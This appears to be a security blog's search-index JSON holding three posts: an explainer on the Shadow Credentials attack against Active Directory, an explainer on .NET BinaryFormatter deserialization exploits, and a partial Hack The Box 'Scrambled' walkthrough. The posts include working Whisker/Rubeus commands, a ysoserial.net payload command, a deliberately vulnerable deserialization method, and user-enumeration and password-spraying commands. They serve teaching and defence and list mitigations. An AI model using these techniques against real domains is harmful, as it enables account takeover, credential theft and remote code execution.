        "content": "Understanding the Shadow Credentials Attack Vector: The Shadow Credentials attack is an advanced technique that exploits Active Directory\u0026rsquo;s certificate-based authentication mechanism to compromise user accounts without changing their passwords. This attack leverages the msDS-KeyCredentialLink attribute to add a malicious certificate, allowing an attacker to impersonate the target user stealthily.\nTo put it simply: If we have the WriteProperty privilege (specifically for the msDS-KeyCredentialLink attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.\nWhat are Shadow Credentials? The Shadow Credentials attack exploits a feature in Active Directory called Key Trust Account Mapping. This technique allows an attacker to compromise a user account without changing its password, making it particularly stealthy and difficult to detect.\nKey Components of the Shadow Credentials Attack: Whisker: A tool used to manipulate the msDS-KeyCredentialLink attribute of a user account. https://github.com/eladshamir/Whisker Rubeus: A tool for interacting with Kerberos authentication. https://github.com/GhostPack/Rubeus Enumerating Users Susceptible to the Shadow Credentials Attack: In blood-hound look for the AddKeyCredentialLink:\nBeing part of the groups below will often provide us with enough privielges to perform the attack:\nKey Admins Enterprise Key Admins Admins Group Enumerating for the WriteProperty msDS-KeyCredentialLink attribute on users: Using PowerView: Get-DomainObjectAcl -Identity \u0026#34;CN=\u0026lt;User Name\u0026gt;,CN=Users,DC=domain,DC=com\u0026#34; -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match \u0026#34;WriteProperty\u0026#34; -and $_.SecurityIdentifier -match \u0026#34;S-1-5-21-.*-500\u0026#34; -and $_.ObjectAceType -eq \u0026#34;00000002-0000-0000-c000-000000000000\u0026#34;} Using Active Directory PowerShell Module:\nImport-Module ActiveDirectory (Get-Acl \u0026#34;AD:CN=\u0026lt;User Name\u0026gt;,CN=Users,DC=domain,DC=com\u0026#34;).Access | Where-Object {$_.ActiveDirectoryRights -match \u0026#34;WriteProperty\u0026#34; -and $_.IdentityReference -match \u0026#34;Domain Admins\u0026#34; -and $_.ObjectType -eq \u0026#34;00000002-0000-0000-c000-000000000000\u0026#34;} Using ADSI Edit:\nA GUI tool for viewing and editing AD objects and their attributes. Connect to the domain Navigate to the user object Right-click and select \u0026ldquo;Properties\u0026rdquo; Go to the \u0026ldquo;Security\u0026rdquo; tab Click \u0026ldquo;Advanced\u0026rdquo; Look for entries with \u0026ldquo;Write msDS-KeyCredentialLink\u0026rdquo; permission Using dsacls Command-Line Tool:\ndsacls \u0026#34;CN=Target User,CN=Users,DC=domain,DC=com\u0026#34; | findstr /i \u0026#34;write.*msDS-KeyCredentialLink\u0026#34; +Shadow Credentials Attack Process: Step by Step+ 0. Pre-requisites for Performing the Shadow Credentials Attack: Domain Functional Level: Must be Windows Server 2016 or higher. *Domain Controllers: The target domain must have at least one Domain Controller running Windows Server 2016 or higher. The Domain Controller used in the attack must have its own certificate and private keys. This requires the organization to have Active Directory Certificate Services (AD CS) or a similar Public Key Infrastructure (PKI), such as a Certification Authority (CA). Attacker Permissions: The attacker needs control over an account with write access to the msDs-KeyCredentialLink attribute on the target user or computer account. 1. Initial Access The attacker starts with some level of access to the domain, typically with privileges to modify user attributes.\n2. Whisker Execution The attacker uses Whisker to add a new \u0026ldquo;shadow credential\u0026rdquo; to the target account:\nwhisker.exe add /target:nbarley /domain:sugarape.local This command:\nGenerates a certificate for the target user (in this case, nbarley) Updates the msDS-KeyCredentialLink attribute of the target account Outputs a Base64-encoded certificate and a password 3. Certificate Generation and Usage Whisker creates:\nAn X.509 certificate An associated private key The certificate\u0026rsquo;s role in this attack:\nIt\u0026rsquo;s added to the user\u0026rsquo;s msDS-KeyCredentialLink attribute in Active Directory This attribute allows for certificate-based authentication as an alternative to password-based auth The certificate is not directly used like a Kerberos ticket (.kirbi file) Instead, the process works like this:\nThe attacker presents the certificate during the Kerberos authentication process Active Directory validates the certificate against the one stored in msDS-KeyCredentialLink If valid, AD issues a Kerberos Ticket Granting Ticket (TGT) for the user 4. Rubeus Exploitation: The attacker then uses Rubeus to leverage the generated certificate:\nRubeus.exe asktgt /user:nbarley /certificate:[Base64 Certificate] /password:\u0026#34;[Password From Whisker]\u0026#34; /domain:sugarape.local /dc:DC.sugarape.local /getcredentials /show This command:\nUses the certificate to request a Kerberos TGT for Nathan Barley (nbarley) The /certificate parameter contains the Base64-encoded certificate The /getcredentials flag attempts to decrypt the encrypted NTLM hash from the TGT The /show flag displays the ticket details and other information If successful, Rubeus receives a TGT and can extract the NTLM hash 5. Credential Extraction: As a result of this process:\nRubeus obtains a TGT for Nathan Barley (nbarley) \u0026amp; generates a .kirbi file which can be used for pass-the-ticket attacks. It also extracts the user\u0026rsquo;s NTLM hash 6. Overview of the attack using pywhisker: +Used On+: https://bloodstiller.com/walkthroughs/forest-box/ Impact of the Shadow Credentials Attack: The attacker gains the ability to authenticate as Nathan Barley nbarley This can lead to further lateral movement or privilege escalation within the domain The attack is stealthy, not triggering typical account modification alerts Shadow Credentials Attack Mitigation Strategies: To protect against Shadow Credentials attacks:\nMonitor for changes to the msDS-KeyCredentialLink attribute Implement strong access controls on who can modify user attributes in Active Directory Use advanced threat detection systems that can identify unusual certificate-based authentication patterns Regularly audit and review certificate issuance and usage in your environment Implement the principle of least privilege for Active Directory administrators Use Protected Users security group for sensitive accounts Enable and configure Windows Defender Credential Guard Regularly patch and update domain controllers and Active Directory services Implement multi-factor authentication (MFA) for all user accounts, especially privileged ones Consider using Privileged Access Workstations (PAWs) for administrative tasks Shadow Credentials Attack Detection Methods Monitor Active Directory Logs: Look for Event ID 4662 with the msDS-KeyCredentialLink attribute being modified. Use PowerShell Scripts: Develop scripts to regularly check for unexpected changes to the msDS-KeyCredentialLink attribute. Implement SIEM Rules: Create alerts for unusual certificate-based authentication attempts, especially from unexpected sources. Network Traffic Analysis: Monitor for unusual Kerberos traffic patterns that might indicate certificate-based authentication abuse. Conclusion The Shadow Credentials attack vector demonstrates the evolving complexity of securing modern Active Directory environments. It highlights the importance of looking beyond traditional password-based security and considering certificate-based authentication mechanisms and critical user attributes.\nAs defenders, staying informed about these advanced techniques is crucial. By understanding attacks like Shadow Credentials, we can better prepare our defenses and protect our organizations from sophisticated threats.\nExample of a Shadow Credentials Attack in Action: Please see my walkthrough/writeup for the Hack The Box machine \u0026ldquo;Outdated\u0026rdquo;: https://app.hackthebox.com/machines/Outdated https://bloodstiller.com/walkthroughs/outdated-box Sources: I would recommend reading this for a DEEP dive onto it by the person who created Whisker, Elad Shamir:\nhttps://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab Here is a great video also showcasing how simple this attack can be:\n", 
        "url": "http:\/\/localhost:1313\/articles\/shadowcredentialsattack\/"
    },
    
    "http:\/\/localhost:1313\/tags\/.net\/": {
        "title": ".NET",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/.net\/"
    },
    
    "http:\/\/localhost:1313\/tags\/deserialization\/": {
        "title": "Deserialization",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/deserialization\/"
    },
    
    "http:\/\/localhost:1313\/tags\/serialization\/": {
        "title": "Serialization",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/serialization\/"
    },
    
    "http:\/\/localhost:1313\/articles\/deserializationattacksexplained\/": {
        "title": "Understanding .NET Deserialization Exploits: A Deep Dive",
        "tags": [".NET","Deserialization","Serialization",],
        "content": "Understanding .NET Deserialization Exploits: A Deep Dive: .NET deserialization exploits have become a common technique; providing a pathway to remote code execution (RCE) on vulnerable systems. Tools like ysoserial.net can generate malicious payloads, allowing attackers to exploit deserialization flaws in .NET applications. But how does this attack vector actually work, and why does it succeed? In this post, we\u0026rsquo;ll walk through the underlying mechanics, focusing on an example using BinaryFormatter with a simple Student class. We\u0026rsquo;ll see how a seemingly innocuous application can be vulnerable to severe attacks.\nWhat is Serialization \u0026amp; Deserialization? Serialization: Serialization is the process of turning objects from a program into a format that’s easy to send (over the network) or save. Formats such as XML and JSON are commonly used for this purpose because they are human-readable compared to binary formats. Once serialized, these objects can be sent over the network or saved for later use. Deserialization: Is the reverse process: converting the transmitted data (e.g., JSON) back into a usable object in memory. For instance, consider a .NET application with a Student class. The code might look like this: [Serializable]\npublic class Student { public int StudentIDNumber { get; set; } public DateTime Birthday { get; set; } public string FirstName { get; set; } public string LastName { get; set; } } When serialized to JSON format, it would look like this: { \u0026#34;StudentIDNumber\u0026#34;:1337, \u0026#34;Birthday\u0026#34;:29062002, \u0026#34;FirstName\u0026#34;:\u0026#34;Nathan\u0026#34;, \u0026#34;LastName\u0026#34;:\u0026#34;Barley\u0026#34; } When serialized using BinaryFormatter, it would create a binary representation of this object. Exploiting Deserialization Vulnerabilities: Imagine an application that allows users to send serialized Student data, which the server converts back into usable objects using BinaryFormatter. If the deserialization process isn\u0026rsquo;t secure, an attacker can modify the data to control what kind of object gets created. Let\u0026rsquo;s explore how this can lead to a serious security vulnerability.\nBinaryFormatter Deserialization Attack: A Detailed Example: Let\u0026rsquo;s walk through how an attacker could exploit a vulnerable application that expects to deserialize Student objects but uses BinaryFormatter unsafely.\nStep 1: Understanding the Vulnerable Application: The application might have a method to process student data:\npublic class StudentProcessor { public void ProcessStudentData(string base64Data) { byte[] binaryData = Convert.FromBase64String(base64Data); using (MemoryStream ms = new MemoryStream(binaryData)) { BinaryFormatter formatter = new BinaryFormatter(); object deserializedObject = formatter.Deserialize(ms); if (deserializedObject is Student student) { // Process the student data Console.WriteLine($\u0026#34;Processed student: {student.FirstName} {student.LastName}\u0026#34;); } } } } +Note+: This code assumes it\u0026rsquo;s always receiving a serialized Student object, which is a dangerous assumption. Step 2: Crafting the Malicious Payload: Instead of sending a legitimate Student object, an attacker uses ysoserial.net to create a malicious payload:\nysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;cmd /c calc.exe\u0026quot; This generates a base64-encoded payload that, when deserialized, will launch the Windows calculator instead of creating a Student object.\nStep 3: Sending the Payload: The attacker sends this payload to the application, perhaps through an API endpoint or a file upload feature that expects serialized student data.\nStep 4: Unintended Deserialization: When the ProcessStudentData method runs, it blindly deserializes the input:\nobject deserializedObject = formatter.Deserialize(ms); Instead of creating a Student object, this line now creates and executes the attacker\u0026rsquo;s payload, launching calc.exe on the server.\nStep 5: Execution and Impact: The calculator launches on the server, demonstrating arbitrary code execution. In a real attack, this could be a reverse shell or any other malicious command.\nHow Does The Deserialization Attack Work? When deserializing data, the application should ideally be constrained to deserialize into a predefined set of safe classes. However, in vulnerable systems, this restriction doesn’t exist. Deserialization libraries like JSON.NET will attempt to deserialize any class that the attacker specifies.\nThis is where tools like ysoserial.net come in. They allow attackers to craft payloads that exploit known vulnerable classes and object types within .NET. The tool generates serialized objects designed to trigger behaviors (like executing commands) when they are deserialized.\nFor example, a crafted payload could exploit a method that runs upon deserialization, leveraging classes that allow arbitrary code execution. If a system blindly deserializes this payload without validation, it unwittingly runs the attacker\u0026rsquo;s code.\nWhy Does This Happen? The root cause of these exploits is a failure to properly validate or restrict what classes the deserialization process can instantiate. By allowing any arbitrary object to be deserialized, attackers can manipulate the data in a way that turns simple data handling into a serious security vulnerability.\nUnderstanding Ysoserial.Net Payloads: Let\u0026rsquo;s break down how ysoserial.net generates a payload for a BinaryFormatter deserialization exploit, contrasting it with our Student class example:\nLegitimate Student Object Serialization: A legitimate serialized Student object using BinaryFormatter might look like this in binary format:\n// Binary representation (simplified for illustration) [SerializationHeaderRecord][ObjectTypeEnum:SystemObject][AssemblyId][ClassName:Student][MemberCount:4] [MemberName:StudentIDNumber][PrimitiveTypeEnum:Int32][Value:1337] [MemberName:Birthday][PrimitiveTypeEnum:DateTime][Value:29062002] [MemberName:FirstName][PrimitiveTypeEnum:String][Value:Nathan] [MemberName:LastName][PrimitiveTypeEnum:String][Value:Barley] This representation includes type information and metadata that BinaryFormatter uses to reconstruct the object during deserialization.\nMalicious Payload Generation: Now, let\u0026rsquo;s examine how ysoserial.net crafts a malicious payload:\nysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c \u0026quot;cmd /c calc.exe\u0026quot;\nThis command generates a base64-encoded payload. When decoded, it might look something like this (simplified):\n// Binary representation (simplified for illustration) [SerializedObjectWithTypeWindowsIdentity][4-byte-length][TypeInfo:WindowsIdentity][MethodToInvoke:Start][Arguments:\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c calc.exe\u0026#34;] Breaking Down the Payload: Object Type: Instead of SerializedStudent, the payload specifies a WindowsIdentity object. Malicious Method: It includes instructions to invoke the Start method, which can execute commands. Command Arguments: The payload includes the command to be executed (calc.exe in this case). Exploitation Process: The vulnerable ProcessStudentData method receives this payload instead of a legitimate Student object. When deserialized, instead of creating a Student instance, it creates a WindowsIdentity object. The deserialization process triggers the execution of the Start method with the provided arguments. As a result, calc.exe is launched on the server, demonstrating arbitrary code execution. This example illustrates how an attacker can exploit the flexibility of BinaryFormatter to execute arbitrary code, even when the application expects a completely different type of object (in our case, a Student).\nPreventing Deserialization Exploits: To protect against these types of attacks, even when working with seemingly harmless classes like our Student example:\nWhitelist Classes: Limit deserialization to specific, safe classes and types. For instance, only allow the Student class to be deserialized. Disable Automatic Deserialization: Avoid deserialization of user-controlled data unless absolutely necessary. If you must deserialize, consider safer alternatives to BinaryFormatter. Use Secure Libraries: Keep libraries updated, as security patches are often released to address deserialization flaws. Sanitize Inputs: Always validate and sanitize any data being deserialized to ensure it conforms to expected formats. Implement Custom Serialization: For classes like Student, consider implementing custom serialization methods that don\u0026rsquo;t rely on potentially dangerous automatic deserialization. By implementing these measures, you can significantly reduce the risk of deserialization attacks, even when working with simple data structures.\nConclusion: Deserialization vulnerabilities, particularly those involving BinaryFormatter, pose a significant risk to .NET applications. As we\u0026rsquo;ve seen with our Student class example, even seemingly innocuous code can be exploited to execute arbitrary commands. By understanding these risks and implementing proper security measures, developers can create more robust and secure applications.\nCorrections: Please let me know if I have anything wrong, more than happy to make corrections. ", 
        "url": "http:\/\/localhost:1313\/articles\/deserializationattacksexplained\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/scrambled-box\/": {
        "title": "Scrambled HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","Kerberos","MSSQL",".NET","Deserialization","CSharp",],
        "content": "Scrambled Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Scrambled How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:18:34 zsh ❯ nmap $box -Pn -oA basicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 08:18 BST Nmap scan report for 10.129.174.234 Host is up (0.039s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds Some great targets here: webserver dns smb ldap mssql In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh took 11s 🕙 14:38:27 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 14:38 BST Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 48.86% done; ETC: 14:41 (0:01:14 remaining) Nmap scan report for 10.129.115.202 Host is up (0.038s latency). Not shown: 65513 filtered tcp ports (no-response) Bug in ms-sql-ntlm-info: no string output. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-06 13:41:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T01:42:36 |_Not valid after: 2023-06-09T01:42:36 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T01:42:36 |_Not valid after: 2023-06-09T01:42:36 |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.129.115.202:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-10-06T07:30:55 |_Not valid after: 2054-10-06T07:30:55 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T01:42:36 |_Not valid after: 2023-06-09T01:42:36 |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T01:42:36 |_Not valid after: 2023-06-09T01:42:36 4411/tcp open found? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3; |_ ERROR_UNKNOWN_COMMAND; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 52608/tcp open msrpc Microsoft Windows RPC 57490/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V=7.94SVN%I=7%D=10/6%Time=67029371%P=x86_64-pc-linux-gnu%r SF:(NULL,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GenericLines,1D,\u0026#34;SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GetRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\. SF:0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(HTTPOptions,35,\u0026#34;SCRAMBLECORP_OR SF:DERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RTSPRequest,35,\u0026#34;SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RPCCheck,1D,\u0026#34; SF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,1D,\u0026#34;SCRAMBLE SF:CORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSStatusRequestTCP,1D,\u0026#34;SCRAMBLECORP_ORDE SF:RS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(Help,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UN SF:KNOWN_COMMAND;\\r\\n\u0026#34;)%r(SSLSessionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\ SF:r\\n\u0026#34;)%r(TerminalServerCookie,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r( SF:TLSSessionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(Kerberos,1D,\u0026#34;SC SF:RAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SMBProgNeg,1D,\u0026#34;SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n\u0026#34;)%r(X11Probe,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(Fo SF:urOhFourRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMM SF:AND;\\r\\n\u0026#34;)%r(LPDString,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNO SF:WN_COMMAND;\\r\\n\u0026#34;)%r(LDAPSearchReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n SF:\u0026#34;)%r(LDAPBindReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SIPOptions,3 SF:5,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(LAND SF:esk-RC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(TerminalServer,1D,\u0026#34;SCR SF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(NCP,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3 SF:;\\r\\n\u0026#34;)%r(NotesRPC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(JavaRMI,1D SF:,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(WMSRequest,1D,\u0026#34;SCRAMBLECORP_ORD SF:ERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(oracle-tns,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34; SF:)%r(ms-sql-s,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(afp,1D,\u0026#34;SCRAMBLE SF:CORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(giop,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\ SF:n\u0026#34;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-06T13:43:41 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 324.38 seconds Interesting find here: Port 4411, looks to be a custom service running. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.12.6 2GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:19:00 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.174.234 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=scrm,DC=local CN=Configuration,DC=scrm,DC=local CN=Schema,CN=Configuration,DC=scrm,DC=local DC=DomainDnsZones,DC=scrm,DC=local DC=ForestDnsZones,DC=scrm,DC=local We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=scrm,DC=local It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. Kerberos 88: User enumeration using Kerbrute : I use kerbrute to check for usernames: kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt I find 5 valid usersnames, I add these to my list of usernames: SMB 445: Checking for NULL \u0026amp; Guest Sessions netexec: I check for NULL \u0026amp; Guest session but they are not accessible:\nnetexec smb $box -u 'guest' -p '' --shares netexec smb $box -u '' -p '' --shares I check to see if any of the users I found in kerbrute have used any of their names as a password:\nnetexec smb $box -u Users.txt -p Users.txt --continue-on-success No hits though: DNS 53: Using dnsenum to check for interesting DNS records: I fire up dnsenum to enumerate any interesting DNS records:\ndnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain I get a hit on an interesting entry straight away:\nws01.scrm.local 192.168.0.54 This could indicate we have another host running on an internal network, or potentially this host is dual nicked and known by WS01.scrm.local on a seperate network. +Note+: I update my /etc/hosts file to contain this entry. HTTP 80: Finding an internal website: I open burpsuite to proxy all traffic through: I navigate to the webserver running on port 80 \u0026amp; find an internal intranet site: As we can see there is nothing to report in Wappalyzer. Fuzzing for pages using FFUF: I use FFUF to fuzz for more .html pages whilst I explor the site:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://$box/FUZZ.html -fc 403 -ic I don\u0026rsquo;t find anything additional: I fuzz for more directories:\nffuf -w 